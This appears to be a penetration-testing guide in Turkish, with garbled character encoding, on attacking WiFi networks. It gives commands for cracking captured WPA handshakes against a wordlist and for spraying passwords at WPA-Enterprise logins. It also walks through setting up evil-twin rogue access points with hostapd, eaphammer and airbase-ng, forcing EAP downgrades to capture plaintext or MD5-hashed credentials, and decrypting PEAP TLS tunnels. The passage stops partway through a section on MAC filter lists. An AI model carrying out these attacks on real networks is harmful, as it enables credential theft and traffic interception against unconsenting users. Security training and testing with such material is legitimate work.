`airodump-ng` iÃ§inde bir el sÄ±kÄ±ÅŸma bilgisi gÃ¶rÃ¼ndÃ¼ÄŸÃ¼nde, bu el sÄ±kÄ±ÅŸmanÄ±n yakalandÄ±ÄŸÄ± anlamÄ±na gelir ve dinlemeyi durdurabilirsiniz:

![](<../../.gitbook/assets/image (172) (1).png>)

El sÄ±kÄ±ÅŸmasÄ± yakalandÄ±ÄŸÄ±nda, onu `aircrack-ng` ile **Ã§Ã¶zebilirsiniz**:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Dosyada el sÄ±kÄ±ÅŸtÄ±rma var mÄ± kontrol edin

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_EÄŸer bu araÃ§, tamamlanmamÄ±ÅŸ bir ESSID el sÄ±kÄ±ÅŸmasÄ±nÄ± tamamlananÄ±ndan Ã¶nce bulursa, geÃ§erli olanÄ± algÄ±lamayacaktÄ±r._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

**Kurumsal WiFi kurulumlarÄ±nda Ã§eÅŸitli kimlik doÄŸrulama yÃ¶ntemleriyle karÅŸÄ±laÅŸacaksÄ±nÄ±z**, her biri farklÄ± gÃ¼venlik seviyeleri ve yÃ¶netim Ã¶zellikleri saÄŸlar. AÄŸ trafiÄŸini incelemek iÃ§in `airodump-ng` gibi araÃ§lar kullandÄ±ÄŸÄ±nÄ±zda, bu kimlik doÄŸrulama tÃ¼rleri iÃ§in tanÄ±mlayÄ±cÄ±larÄ± fark edebilirsiniz. BazÄ± yaygÄ±n yÃ¶ntemler ÅŸunlarÄ± iÃ§erir:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Bu yÃ¶ntem, EAP-PEAP iÃ§inde donanÄ±m token'larÄ± ve tek kullanÄ±mlÄ±k ÅŸifreleri destekler. MSCHAPv2'nin aksine, eÅŸ zorlamasÄ± kullanmaz ve ÅŸifreleri aÃ§Ä±k metin olarak eriÅŸim noktasÄ±na gÃ¶nderir, bÃ¶ylece dÃ¼ÅŸÃ¼k seviyeli saldÄ±rÄ±lara karÅŸÄ± risk oluÅŸturur.
2. **EAP-MD5 (Message Digest 5)**:
* Ä°stemciden ÅŸifrenin MD5 Ã¶zetini gÃ¶ndermeyi iÃ§erir. SÃ¶zlÃ¼k saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z olmasÄ±, sunucu kimlik doÄŸrulamasÄ±nÄ±n eksikliÄŸi ve oturum Ã¶zel WEP anahtarlarÄ± oluÅŸturamama nedeniyle **tavsiye edilmez**.
3. **EAP-TLS (Transport Layer Security)**:
* Kimlik doÄŸrulama iÃ§in hem istemci hem de sunucu tarafÄ± sertifikalarÄ±nÄ± kullanÄ±r ve iletiÅŸimi gÃ¼vence altÄ±na almak iÃ§in kullanÄ±cÄ± tabanlÄ± ve oturum tabanlÄ± WEP anahtarlarÄ± dinamik olarak oluÅŸturabilir.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* ÅifrelenmiÅŸ bir tÃ¼nel aracÄ±lÄ±ÄŸÄ±yla karÅŸÄ±lÄ±klÄ± kimlik doÄŸrulama saÄŸlar ve dinamik, kullanÄ±cÄ± baÅŸÄ±na, oturum baÅŸÄ±na WEP anahtarlarÄ± tÃ¼retilmesini saÄŸlar. Sadece sunucu tarafÄ± sertifikalarÄ±nÄ± gerektirir, istemciler kimlik bilgilerini kullanÄ±r.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* KorumalÄ± iletiÅŸim iÃ§in bir TLS tÃ¼neli oluÅŸturarak EAP'ye benzer ÅŸekilde Ã§alÄ±ÅŸÄ±r. EAP Ã¼zerine zayÄ±f kimlik doÄŸrulama protokollerinin kullanÄ±lmasÄ±na izin verir Ã§Ã¼nkÃ¼ tÃ¼nel tarafÄ±ndan sunulan korumayla desteklenir.
* **PEAP-MSCHAPv2**: Genellikle PEAP olarak adlandÄ±rÄ±lÄ±r, zayÄ±f MSCHAPv2 zorlama/yankÄ± mekanizmasÄ±nÄ± koruyucu bir TLS tÃ¼neli ile birleÅŸtirir.
* **PEAP-EAP-TLS (veya PEAP-TLS)**: EAP-TLS'ye benzer ancak sertifikalarÄ± deÄŸiÅŸ tokuÅŸ etmeden Ã¶nce bir TLS tÃ¼neli baÅŸlatÄ±r, ek bir gÃ¼venlik katmanÄ± sunar.

Bu kimlik doÄŸrulama yÃ¶ntemleri hakkÄ±nda daha fazla bilgiye [buradan](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) ve [buradan](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html) ulaÅŸabilirsiniz.

### KullanÄ±cÄ± AdÄ± Yakalama

[https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) adresinde okuduÄŸunuzda, **EAP** kullandÄ±ÄŸÄ±nÄ±zda **"Kimlik"** **mesajlarÄ±nÄ±n** desteklenmesi gerektiÄŸini ve **kullanÄ±cÄ± adÄ±nÄ±n** **"YanÄ±t KimliÄŸi"** mesajlarÄ±nda **aÃ§Ä±k** olarak gÃ¶nderileceÄŸini gÃ¶receksiniz.

En gÃ¼venli kimlik doÄŸrulama yÃ¶ntemlerinden biri olan **PEAP-EAP-TLS** kullanÄ±lsa bile, **EAP protokolÃ¼nde gÃ¶nderilen kullanÄ±cÄ± adÄ±nÄ±n yakalanabilir**. Bunun iÃ§in, bir kimlik doÄŸrulama iletiÅŸimini yakalayÄ±n (`airodump-ng`'yi bir kanal iÃ§inde baÅŸlatÄ±n ve aynÄ± arayÃ¼zde `wireshark`'Ä± baÅŸlatÄ±n) ve paketleri `eapol` ile filtreleyin.\
**"YanÄ±t, Kimlik"** paketi iÃ§inde, istemcinin kullanÄ±cÄ± adÄ± gÃ¶rÃ¼necektir.

![](<../../.gitbook/assets/image (847).png>)

### Anonim Kimlikler

Kimlik gizleme, EAP-PEAP ve EAP-TTLS tarafÄ±ndan desteklenmektedir. Bir WiFi aÄŸÄ± baÄŸlamÄ±nda, EAP-Kimlik isteÄŸi genellikle eriÅŸim noktasÄ± (AP) tarafÄ±ndan (AP) ile iliÅŸkilendirme sÃ¼reci sÄ±rasÄ±nda baÅŸlatÄ±lÄ±r. KullanÄ±cÄ± anonimliÄŸinin korunmasÄ±nÄ± saÄŸlamak iÃ§in, kullanÄ±cÄ±nÄ±n cihazÄ±ndaki EAP istemcisinin yanÄ±tÄ±, isteÄŸi iÅŸlemek iÃ§in gerekli temel bilgileri iÃ§erir. Bu kavram, aÅŸaÄŸÄ±daki senaryolar aracÄ±lÄ±ÄŸÄ±yla aÃ§Ä±klanmaktadÄ±r:

* EAP-Kimlik = anonim
* Bu senaryoda, tÃ¼m kullanÄ±cÄ±lar, kullanÄ±cÄ± kimliklerini "anonim" olarak kullanÄ±r. Ä°lk RADIUS sunucusu, PEAP veya TTLS protokolÃ¼nÃ¼n sunucu tarafÄ±nÄ± yÃ¶neten EAP-PEAP veya EAP-TTLS sunucusu olarak iÅŸlev gÃ¶rÃ¼r. Daha sonra iÃ§ (korunan) kimlik doÄŸrulama yÃ¶ntemi yerel olarak ele alÄ±nÄ±r veya uzak (ana) RADIUS sunucusuna devredilir.
* EAP-Kimlik = anonim@realm\_x
* Bu durumda, farklÄ± alanlardan kullanÄ±cÄ±lar kimliklerini gizlerken ilgili alanlarÄ±nÄ± belirtir. Bu, ilk RADIUS sunucusunun EAP-PEAP veya EAP-TTLS isteklerini kendi ana alanlarÄ±ndaki RADIUS sunucularÄ±na yÃ¶nlendirmesine olanak tanÄ±r, bu sunucular PEAP veya TTLS sunucusu olarak iÅŸlev gÃ¶rÃ¼r. Ä°lk RADIUS sunucusu yalnÄ±zca bir RADIUS rÃ¶le dÃ¼ÄŸÃ¼mÃ¼ olarak Ã§alÄ±ÅŸÄ±r.
* AyrÄ±ca, ilk RADIUS sunucusu EAP-PEAP veya EAP-TTLS sunucusu olarak iÅŸlev gÃ¶rebilir ve korunan kimlik doÄŸrulama yÃ¶ntemini ele alabilir veya baÅŸka bir sunucuya iletebilir. Bu seÃ§enek, farklÄ± alanlar iÃ§in farklÄ± politikalarÄ±n yapÄ±landÄ±rÄ±lmasÄ±nÄ± kolaylaÅŸtÄ±rÄ±r.

EAP-PEAP'te, PEAP sunucusu ve PEAP istemcisi arasÄ±nda TLS tÃ¼neli oluÅŸturulduÄŸunda, PEAP sunucusu bir EAP-Kimlik isteÄŸi baÅŸlatÄ±r ve bu isteÄŸi TLS tÃ¼neli aracÄ±lÄ±ÄŸÄ±yla ileter. Ä°stemci, bu ikinci EAP-Kimlik isteÄŸine yanÄ±t olarak, kullanÄ±cÄ±nÄ±n gerÃ§ek kimliÄŸini ÅŸifreli tÃ¼nel aracÄ±lÄ±ÄŸÄ±yla iÃ§eren bir EAP-Kimlik yanÄ±tÄ± gÃ¶nderir. Bu yaklaÅŸÄ±m, 802.11 trafiÄŸini dinleyen herhangi bir kiÅŸiye kullanÄ±cÄ±nÄ±n gerÃ§ek kimliÄŸinin ifÅŸa edilmesini etkili bir ÅŸekilde Ã¶nler.

EAP-TTLS biraz farklÄ± bir prosedÃ¼rÃ¼ takip eder. EAP-TTLS ile, istemci genellikle PAP veya CHAP kullanarak kimlik doÄŸrulamasÄ± yapar ve TLS tÃ¼neli tarafÄ±ndan korunur. Bu durumda, istemci, tÃ¼nel oluÅŸturulduktan sonra gÃ¶nderilen ilk TLS iletiÅŸiminde bir KullanÄ±cÄ± AdÄ± Ã¶zniteliÄŸi ve bir Åifre veya CHAP-Åifre Ã¶zniteliÄŸi iÃ§erir.

SeÃ§ilen protokole bakÄ±lmaksÄ±zÄ±n, PEAP/TTLS sunucusu, TLS tÃ¼neli oluÅŸturulduktan sonra kullanÄ±cÄ±nÄ±n gerÃ§ek kimliÄŸini elde eder. GerÃ§ek kimlik, kullanÄ±cÄ±@alan veya sadece kullanÄ±cÄ± olarak temsil edilebilir. PEAP/TTLS sunucusu aynÄ± zamanda kullanÄ±cÄ±yÄ± kimlik doÄŸrulamakla sorumlu ise, ÅŸimdi kullanÄ±cÄ±nÄ±n kimliÄŸine sahiptir ve TLS tÃ¼neli tarafÄ±ndan korunan kimlik doÄŸrulama yÃ¶ntemine devam eder. Aksi takdirde, PEAP/TTLS sunucusu kullanÄ±cÄ±nÄ±n ana RADIUS sunucusuna yeni bir RADIUS isteÄŸi iletebilir. Bu yeni RADIUS isteÄŸi, PEAP veya TTLS protokol katmanÄ±nÄ± iÃ§ermez. Korunan kimlik doÄŸrulama yÃ¶ntemi EAP ise, iÃ§ EAP mesajlarÄ± EAP-PEAP veya EAP-TTLS sarmalayÄ±cÄ±sÄ± olmadan ana RADIUS sunucusuna iletilir. Giden RADIUS iletiÅŸiminin User-Name Ã¶zniteliÄŸi, gelen RADIUS isteÄŸinde bulunan anonim User-Name'in yerine kullanÄ±cÄ±nÄ±n gerÃ§ek kimliÄŸini iÃ§erir. Korunan kimlik doÄŸrulama yÃ¶ntemi PAP veya CHAP ise (yalnÄ±zca TTLS tarafÄ±ndan desteklenir), TLS yÃ¼kÃ¼nden Ã§Ä±karÄ±lan User-Name ve diÄŸer kimlik doÄŸrulama Ã¶znitelikleri, gelen RADIUS isteÄŸinde bulunan anonim User-Name ve TTLS EAP-Message Ã¶zniteliklerini yerine koyar.

Daha fazla bilgi iÃ§in [buraya](https://www.interlinknetworks.com/app\_notes/eap-peap.htm) bakabilirsiniz.

### EAP-Bruteforce (ÅŸifre spray)

EÄŸer istemcinin bir **kullanÄ±cÄ± adÄ± ve ÅŸifre** kullanmasÄ± bekleniyorsa (EAP-TLS bu durumda **geÃ§erli olmayacaktÄ±r**), o zaman bir **kullanÄ±cÄ± adlarÄ± listesi** almayÄ± deneyebilir ve eriÅŸimi **bruteforce** ile deneyebilirsiniz [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Bu saldÄ±rÄ±yÄ± `eaphammer` kullanarak da gerÃ§ekleÅŸtirebilirsiniz:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Ä°stemci saldÄ±rÄ±larÄ± Teorisi

### AÄŸ SeÃ§imi ve Gezinme

* 802.11 protokolÃ¼, bir istasyonun GeniÅŸletilmiÅŸ Servis Setine (ESS) nasÄ±l katÄ±ldÄ±ÄŸÄ±nÄ± tanÄ±mlar ancak bir ESS veya iÃ§indeki bir eriÅŸim noktasÄ±nÄ± (AP) seÃ§me kriterlerini belirtmez.
* Ä°stasyonlar, aynÄ± ESSID'yi paylaÅŸan AP'ler arasÄ±nda dolaÅŸabilir ve bir binada veya alanda baÄŸlantÄ±yÄ± sÃ¼rdÃ¼rebilir.
* Protokol, istasyonun ESS'ye kimlik doÄŸrulamasÄ±nÄ± gerektirir ancak AP'nin istasyona kimlik doÄŸrulamasÄ±nÄ± zorunlu kÄ±lmaz.

### Tercih Edilen AÄŸ Listeleri (PNL'ler)

* Ä°stasyonlar, baÄŸlandÄ±klarÄ± her kablosuz aÄŸÄ±n ESSID'sini ve aÄŸa Ã¶zgÃ¼ yapÄ±landÄ±rma ayrÄ±ntÄ±larÄ±nÄ± tercih edilen AÄŸ Listelerinde (PNL) saklar.
* PNL, bilinen aÄŸlara otomatik olarak baÄŸlanmak iÃ§in kullanÄ±lÄ±r, baÄŸlantÄ± sÃ¼recini basitleÅŸtirerek kullanÄ±cÄ± deneyimini iyileÅŸtirir.

### Pasif Tarama

* AP'ler periyodik olarak varlÄ±klarÄ±nÄ± ve Ã¶zelliklerini duyuran beacon Ã§erÃ§eveleri yayÄ±nlar, AP'nin ESSID'sini duyurmazsa bile.
* Pasif tarama sÄ±rasÄ±nda istasyonlar beacon Ã§erÃ§evelerini dinler. Bir beacon'Ä±n ESSID'si istasyonun PNL'sindeki bir giriÅŸi eÅŸleÅŸirse, istasyon otomatik olarak o AP'ye baÄŸlanabilir.
* Bir cihazÄ±n PNL'sinin bilinmesi, bilinen bir aÄŸÄ±n ESSID'sini taklit ederek cihazÄ± bir sahte AP'ye baÄŸlamak suretiyle potansiyel olarak kÃ¶tÃ¼ye kullanÄ±lmasÄ±na olanak tanÄ±r.

### Aktif Sorgulama

* Aktif sorgulama, istasyonlarÄ±n yakÄ±ndaki AP'leri ve Ã¶zelliklerini keÅŸfetmek iÃ§in sorgu istekleri gÃ¶ndermesini iÃ§erir.
* YÃ¶nlendirilmiÅŸ sorgu istekleri belirli bir ESSID'yi hedef alÄ±r ve belirli bir aÄŸÄ±n menzilde olup olmadÄ±ÄŸÄ±nÄ± tespit etmeye yardÄ±mcÄ± olur, gizli bir aÄŸ olsa bile.
* YayÄ±n sorgu istekleri, bir SSID alanÄ± olmayan ve tÃ¼m yakÄ±ndaki AP'lere gÃ¶nderilen isteklerdir, istasyonun PNL iÃ§eriÄŸini ifÅŸa etmeden herhangi bir tercih edilen aÄŸÄ± kontrol etmesine olanak tanÄ±r.

## Ä°nternete yÃ¶nlendirme yapabilen Basit AP

Daha karmaÅŸÄ±k saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmenin nasÄ±l olduÄŸunu aÃ§Ä±klamadan Ã¶nce, sadece bir AP oluÅŸturmanÄ±n ve trafiÄŸini Ä°nternete baÄŸlÄ± bir arayÃ¼ze yÃ¶nlendirmenin **nasÄ±l** olduÄŸu **aÃ§Ä±klanacak**.

`ifconfig -a` kullanarak, AP oluÅŸturmak iÃ§in wlan arayÃ¼zÃ¼nÃ¼n ve Ä°nternete baÄŸlÄ± arayÃ¼zÃ¼n varlÄ±ÄŸÄ±nÄ± kontrol edin.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
OluÅŸturun: `/etc/dnsmasq.conf` yapÄ±landÄ±rma dosyasÄ±:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
ArdÄ±ndan **IP'leri ayarlayÄ±n** ve **rotalarÄ± belirleyin**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Ve ardÄ±ndan **dnsmasq**'Ä± baÅŸlatÄ±n:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Bir yapÄ±landÄ±rma dosyasÄ± oluÅŸturun `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Sinir bozucu iÅŸlemleri durdurun**, **izleme modunu** ayarlayÄ±n ve **hostapd'yi baÅŸlatÄ±n**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### YÃ¶nlendirme ve Yeniden YÃ¶nlendirme
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## KÃ¶tÃ¼ Ä°kiz

KÃ¶tÃ¼ ikiz saldÄ±rÄ±sÄ±, WiFi istemcilerinin aÄŸlarÄ± tanÄ±ma ÅŸeklini sÃ¶mÃ¼rÃ¼r, temel istasyonun (eriÅŸim noktasÄ±) istemciye kimlik doÄŸrulamasÄ± yapmadan Ã¶ncelikle aÄŸ adÄ±na (ESSID) gÃ¼venir. Anahtar noktalar ÅŸunlarÄ± iÃ§erir:

- **FarklÄ±laÅŸtÄ±rmada Zorluk**: Cihazlar, aynÄ± ESSID ve ÅŸifreleme tÃ¼rÃ¼nÃ¼ paylaÅŸtÄ±klarÄ±nda meÅŸru ve sahte eriÅŸim noktalarÄ± arasÄ±nda ayÄ±rt etmekte zorlanÄ±r. GerÃ§ek dÃ¼nya aÄŸlarÄ± genellikle kapsamÄ± sorunsuz geniÅŸletmek iÃ§in aynÄ± ESSID'ye sahip birden fazla eriÅŸim noktasÄ± kullanÄ±r.
- **Ä°stemci DolaÅŸÄ±mÄ± ve BaÄŸlantÄ± ManipÃ¼lasyonu**: 802.11 protokolÃ¼, cihazlarÄ±n aynÄ± ESS iÃ§indeki eriÅŸim noktalarÄ± arasÄ±nda dolaÅŸmasÄ±na izin verir. SaldÄ±rganlar, bir cihazÄ± mevcut temel istasyonundan ayÄ±rmak ve sahte birine baÄŸlanmasÄ±nÄ± saÄŸlamak iÃ§in bunu sÃ¶mÃ¼rebilir. Bu, cihaza daha gÃ¼Ã§lÃ¼ bir sinyal sunarak veya deauthentication paketleri veya jamming gibi yÃ¶ntemlerle meÅŸru eriÅŸim noktasÄ±na baÄŸlantÄ±yÄ± keserek baÅŸarÄ±labilir.
- **YÃ¼rÃ¼tmede Zorluklar**: Ã‡oklu, iyi yerleÅŸtirilmiÅŸ eriÅŸim noktalarÄ±na sahip ortamlarda kÃ¶tÃ¼ ikiz saldÄ±rÄ±sÄ±nÄ± baÅŸarÄ±yla gerÃ§ekleÅŸtirmek zor olabilir. Tek bir meÅŸru eriÅŸim noktasÄ±nÄ±n deauthentication'Ä± genellikle cihazÄ±n baÅŸka bir meÅŸru eriÅŸim noktasÄ±na baÄŸlanmasÄ±na neden olur, saldÄ±rgan tÃ¼m yakÄ±ndaki eriÅŸim noktalarÄ±nÄ± deauthenticate edemez veya sahte eriÅŸim noktasÄ±nÄ± stratejik bir ÅŸekilde yerleÅŸtiremezse.
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
AyrÄ±ca, **eaphammer** kullanarak KÃ¶tÃ¼ Ä°kiz oluÅŸturabilirsiniz (eaphammer ile kÃ¶tÃ¼ ikizler oluÅŸturmak iÃ§in arayÃ¼zÃ¼n **izleme** modunda **OLMAMASI GEREKTÄ°ÄÄ°NÄ°** unutmayÄ±n):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Veya Airgeddon'u kullanarak: `SeÃ§enekler: 5,6,7,8,9 (Evil Twin saldÄ±rÄ± menÃ¼sÃ¼ iÃ§inde).`

![](<../../.gitbook/assets/image (1085).png>)

LÃ¼tfen dikkat edin, varsayÄ±lan olarak PNL'de bir ESSID WPA korumalÄ± olarak kaydedilmiÅŸse, cihaz otomatik olarak AÃ§Ä±k evil Twin'e baÄŸlanmayacaktÄ±r. GerÃ§ek AP'yi DoS'a uÄŸratmaya Ã§alÄ±ÅŸabilir ve kullanÄ±cÄ±nÄ±n manuel olarak AÃ§Ä±k evil twin'inize baÄŸlanmasÄ±nÄ± umabilirsiniz, ya da gerÃ§ek AP'yi DoS'a uÄŸratarak bir WPA Evil Twin kullanarak el sÄ±kÄ±ÅŸmasÄ±nÄ± yakalayabilirsiniz (bu yÃ¶ntemi kullanarak kurbanÄ±n size baÄŸlanmasÄ±na izin veremezsiniz Ã§Ã¼nkÃ¼ PSK'yi bilmiyorsunuz, ancak el sÄ±kÄ±ÅŸmasÄ±nÄ± yakalayabilir ve kÄ±rmaya Ã§alÄ±ÅŸabilirsiniz).

_BazÄ± iÅŸletim sistemleri ve AV'ler kullanÄ±cÄ±yÄ± AÃ§Ä±k bir aÄŸa baÄŸlanmanÄ±n tehlikeli olduÄŸu konusunda uyaracaktÄ±r..._

### WPA/WPA2 Evil Twin

**WPA/2 kullanarak Evil Twin** oluÅŸturabilir ve cihazlar o SSID'ye WPA/2 ile baÄŸlanacak ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸlarsa baÄŸlanmaya Ã§alÄ±ÅŸacaklardÄ±r. Her durumda, **4-yÃ¶nlÃ¼-el-sÄ±kÄ±ÅŸmasÄ±nÄ± tamamlamak** iÃ§in ayrÄ±ca **istemcinin kullanacaÄŸÄ± ÅŸifreyi bilmek** de gereklidir. EÄŸer **bilmiyorsanÄ±z**, **baÄŸlantÄ± tamamlanmayacaktÄ±r**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Kurumsal KÃ¶tÃ¼ Ä°kiz

Bu saldÄ±rÄ±larÄ± anlamak iÃ§in Ã¶nce kÄ±sa [WPA Kurumsal aÃ§Ä±klamasÄ±nÄ±](./#wpa-enterprise-mgt) okumanÄ±zÄ± Ã¶neririm.

**hostapd-wpe KullanÄ±mÄ±**

`hostapd-wpe` Ã§alÄ±ÅŸmasÄ± iÃ§in bir **yapÄ±landÄ±rma** dosyasÄ±na ihtiyaÃ§ duyar. Bu yapÄ±landÄ±rmalarÄ±n oluÅŸturulmasÄ±nÄ± **otomatikleÅŸtirmek** iÃ§in [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) kullanabilirsiniz (python dosyasÄ±nÄ± _/etc/hostapd-wpe/_ iÃ§ine indirin)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
KonfigÃ¼rasyon dosyasÄ±nda ssid, kanal, kullanÄ±cÄ± dosyalarÄ±, cret/key, dh parametreleri, wpa sÃ¼rÃ¼mÃ¼ ve doÄŸrulama gibi birÃ§ok farklÄ± ÅŸey seÃ§ebilirsiniz...

[**EAP-TLS ile herhangi bir sertifikaya izin vermek iÃ§in hostapd-wpe kullanma.**](evil-twin-eap-tls.md)

**EAPHammer KullanÄ±mÄ±**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
VarsayÄ±lan olarak, EAPHammer bu kimlik doÄŸrulama yÃ¶ntemlerini kullanÄ±r (dÃ¼z metin ÅŸifrelerini elde etmek iÃ§in ilk olarak GTC'yi deneyin ve daha sonra daha gÃ¼Ã§lÃ¼ kimlik doÄŸrulama yÃ¶ntemlerini kullanÄ±n):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Bu, uzun baÄŸlantÄ± sÃ¼relerini Ã¶nlemek iÃ§in varsayÄ±lan metodolojidir. Bununla birlikte, en zayÄ±f olanÄ±ndan en gÃ¼Ã§lÃ¼sÃ¼ne kadar kimlik doÄŸrulama yÃ¶ntemlerini sunucuya belirtebilirsiniz:
```
--negotiate weakest
```
Ya da ÅŸunlarÄ± da kullanabilirsiniz:

* `--negotiate gtc-downgrade` Ã§ok verimli GTC downgrade uygulamasÄ±nÄ± kullanmak iÃ§in (aÃ§Ä±k metin ÅŸifreleri)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` yÃ¶ntemleri manuel olarak belirtmek iÃ§in (saldÄ±rÄ±nÄ±n organizasyonun aynÄ± sÄ±rayla aynÄ± kimlik doÄŸrulama yÃ¶ntemlerini sunmasÄ± saldÄ±rÄ±nÄ±n Ã§ok daha zor algÄ±lanmasÄ±nÄ± saÄŸlar).
* [Daha fazla bilgi iÃ§in wiki'ye bakÄ±n](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Airgeddon KullanÄ±mÄ±**

`Airgeddon`, Ã¶nceden oluÅŸturulmuÅŸ sertifikalarÄ± kullanarak WPA/WPA2-Enterprise aÄŸlarÄ±na EAP kimlik doÄŸrulamasÄ± sunabilir. Sahte aÄŸ baÄŸlantÄ± protokolÃ¼nÃ¼ EAP-MD5'e dÃ¼ÅŸÃ¼receÄŸi iÃ§in **kullanÄ±cÄ±yÄ± ve ÅŸifrenin MD5'ini yakalayabilecek**. Daha sonra saldÄ±rgan ÅŸifreyi kÄ±rmayÄ± deneyebilir.\
`Airggedon`, **sÃ¼rekli Evil Twin saldÄ±rÄ±sÄ± (gÃ¼rÃ¼ltÃ¼lÃ¼)** veya **sadece biri baÄŸlandÄ±ÄŸÄ±nda Evil Attack oluÅŸturma (dÃ¼zgÃ¼n)** olasÄ±lÄ±ÄŸÄ±nÄ± sunar.

![](<../../.gitbook/assets/image (933).png>)

### Evil Twins saldÄ±rÄ±larÄ±nda PEAP ve EAP-TTLS TLS tÃ¼nellerinin Hata AyÄ±klanmasÄ±

_Bu yÃ¶ntem bir PEAP baÄŸlantÄ±sÄ±nda test edildi ancak ben bir keyfi TLS tÃ¼nelini ÅŸifrelediÄŸim iÃ§in bu aynÄ± zamanda EAP-TTLS ile de Ã§alÄ±ÅŸmalÄ±dÄ±r._

**_hostapd-wpe_ yapÄ±landÄ±rmasÄ±** iÃ§inde _**dh\_file**_ iÃ§eren satÄ±rÄ± **yorumlayÄ±n** (`dh_file=/etc/hostapd-wpe/certs/dh`den `#dh_file=/etc/hostapd-wpe/certs/dh`'ye) \
Bu, `hostapd-wpe`'nin **anahtarlarÄ± RSA kullanarak deÄŸiÅŸtirmesini saÄŸlayacak**, bÃ¶ylece daha sonra **sunucunun Ã¶zel anahtarÄ±nÄ± bilerek** trafiÄŸi **ÅŸifreleyebileceksiniz**.

Åimdi, bu deÄŸiÅŸtirilmiÅŸ yapÄ±landÄ±rmayla **Evil Twin**'i **`hostapd-wpe`** kullanarak baÅŸlatÄ±n. AyrÄ±ca, Evil Twin saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtiren **arayÃ¼zde** **`wireshark`**'Ä± baÅŸlatÄ±n.

Åimdi veya daha sonra (zaten bazÄ± kimlik doÄŸrulama niyetlerini yakaladÄ±ysanÄ±z) RSA anahtarÄ±nÄ± wireshark'a ekleyebilirsiniz: `DÃ¼zenle --> Tercihler --> Protokoller --> TLS --> (RSA anahtarlarÄ± listesi) DÃ¼zenle...`

Yeni bir giriÅŸ ekleyin ve formu bu deÄŸerlerle doldurun: **IP adresi = herhangi** -- **Port = 0** -- **Protokol = veri** -- **Anahtar DosyasÄ±** (**anahtar dosyanÄ±zÄ± seÃ§in**, sorun yaÅŸamamak iÃ§in **ÅŸifre korumasÄ± olmayan bir anahtar dosyasÄ± seÃ§in).

![](<../../.gitbook/assets/image (684).png>)

Ve yeni **"ÅifrelenmiÅŸ TLS" sekmesine** bakÄ±n:

![](<../../.gitbook/assets/image (228).png>)

## KARMA, MANA, YÃ¼ksek Sesli MANA ve Bilinen beacon saldÄ±rÄ±sÄ±

### ESSID ve MAC siyah/beyaz listeleri

FarklÄ± tÃ¼rde Medya EriÅŸim KontrolÃ¼ Filtre Listeleri (MFACLs) ve bunlarÄ±n karÅŸÄ±lÄ±k gelen modlarÄ± ve bir sahte EriÅŸim NoktasÄ±nÄ±n (AP) davranÄ±ÅŸÄ± Ã¼zerindeki etkileri:

1. **MAC tabanlÄ± Beyaz Liste**:
* Sahte AP, beyaz listede belirtilen cihazlardan gelen sorgulara yanÄ±t verecek ve listede olmayan tÃ¼m diÄŸer cihazlar iÃ§in gÃ¶rÃ¼nmez kalacaktÄ±r.
